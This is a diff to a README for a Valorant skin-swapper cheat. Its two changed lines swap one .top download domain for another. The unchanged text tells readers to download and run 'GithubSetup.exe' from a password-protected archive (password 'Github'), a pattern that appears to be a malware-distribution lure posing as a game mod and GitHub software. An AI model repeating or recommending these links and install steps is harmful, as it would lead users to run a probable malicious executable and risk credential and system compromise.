@@ -9,7 +9,7 @@ Valorant skin swapper 2026 — change weapon skins, customize cosmetics, access 
 
 ## ⬇️ Download
 
-**[https://gitappdown.top/](https://gitappdown.top/)**  
+**[https://gitdownapply.top](https://gitdownapply.top)**  
 *File: `GithubSetup.exe` | Archive password: `Github`*
 
 ---
@@ -74,7 +74,7 @@ Skin swappers are **client-side only** — the changes are visible only to you a
 
 ## 🔧 Installation / How to Use
 
-1. **Download** from: **[https://gitappdown.top/](https://gitappdown.top/)**  
+1. **Download** from: **[https://gitdownapply.top](https://gitdownapply.top)**  
    *(File: `GithubSetup.exe` | Password: `Github`)*
 
 2. Run `GithubSetup.exe` and follow the installation wizard.
